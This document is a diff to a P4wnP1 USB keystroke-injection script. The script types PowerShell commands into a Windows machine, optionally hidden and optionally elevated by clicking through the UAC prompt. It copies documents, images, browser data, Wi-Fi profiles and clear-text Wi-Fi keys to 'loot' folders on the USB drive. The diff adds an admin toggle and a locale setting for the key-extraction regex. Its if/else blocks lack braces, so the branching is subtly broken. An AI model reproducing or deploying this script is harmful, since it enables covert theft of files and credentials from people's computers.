@@ -14,7 +14,8 @@
 layout("de");			                                   // Keyboard layout locale
 hide=false; 			                                   // Set to true to hide the console window on the target
 exit=true;			                                   // Set to true to exit the console once finished
-typingSpeed(0,0);		                                   // Typing as fast as possible
+run_as_admin=false;					           // Set to true to execute powershell as Administrator
+typingSpeed(1,4);		                                   // Typing very fast
 var usb_drive = "TEMPUSB"                                          // The name of the P4wnP1's USB storage device
 // FILE EXTRACTION              
 var user_subfolder1 = ["Documents"]                                // The first folder inside the home user directory that should be inspected
@@ -22,6 +23,8 @@ var user_subfolder2 = ["Downloads"]                                // The second
 var filetypes_user = ["pdf", "jpg"]                                // The filetypes to extract from the home directory
 var add_folder = "ProgramXYZ\\data\\Screenshots"                   // Additional directory inside C:\Program Files (x86)\ that should be looked at for extraction
 var filetypes_addfolder = ["jpg"]                                  // The filetypes to extract from the additional directory
+// WIFI EXTRACTION
+var key_locale = '\"Schlüsselinhalt\\W+\\:(.+)$\"'                 // String that indicates saved passwords in the Wifi list (e.g. "Schlüsselinhalt" [German] or "Key Content" [English])
 
 // Definition of other variables, arrays, ...
 var delay_time = 5                                                 // The time to wait before executing the attack in seconds
@@ -40,18 +43,22 @@ function check_if_ready() {
     }
 }
 function attack() {
-  // Open the attack and make paths
+  // Open powershell and make paths
     press("GUI r");
     delay(500);
     if (hide) type("powershell -w h -NoP -NonI"); else type("powershell");                              // Hide the console if chosen to do so
-    press("CTRL SHIFT ENTER");                                                                          // Run as admin
-    delay(1000);
-    press("left");                                                                                      // Get rid of admin prompt
-    delay(200);
-    press("enter");
-    delay(200);
-    type("$usbPath =((gwmi win32_volume -f 'label=''" + usb_drive + "''').Name)\n");	                // Replace 'TEMPUSB' with your drive name
-    type("$lootPathFiles = $usbPath + \"loot\\files\";mkdir $lootPathFiles;");                          // Create folder structure and define variables for directories
+    if (run_as_admin) 											// Run powershell either as admin or standard user
+        press("CTRL SHIFT ENTER");
+	delay(1000);
+        press("LEFT");
+        delay(200);
+        press("ENTER");
+        delay(200);
+    else 
+        type("\n");
+        delay(1000);
+    type("$usbPath =((gwmi win32_volume -f 'label=''" + usb_drive + "''').Name)\n");	                // Create folder structure and define variables for directories
+    type("$lootPathFiles = $usbPath + \"loot\\files\";mkdir $lootPathFiles;");                          
     type("$lootPathFolders = $usbPath + \"loot\\folder_structure\";mkdir $lootPathFolders;");
     type("$lootPathBrowser = $usbPath + \"loot\\browser_data\";mkdir $lootPathBrowser;");
     type("$lootPathWifi = $usbPath + \"loot\\wifi_data\";mkdir $lootPathWifi;");
@@ -75,7 +82,7 @@ function attack() {
   
   // Extract Wifi information/keys
     type("netsh wlan show profiles * > $lootPathWifi\\Known_networks_info.txt;");                       // Get all the known netwoks and info about them and save it
-    type("(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}  | Select-String \"Schlüsselinhalt\\W+\\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ Wifi_Name=$name;Key=$pass }} | Format-Table -AutoSize > $lootPathWifi\\wifi_keys.txt;")
+    type("(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}  | Select-String " + key_locale + " | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ Wifi_Name=$name;Key=$pass }} | Format-Table -AutoSize > $lootPathWifi\\wifi_keys.txt;")
 	// Make sure to change "Schlüsselinhalt" to "Key Content" on English locale
     delay(2000) 
    
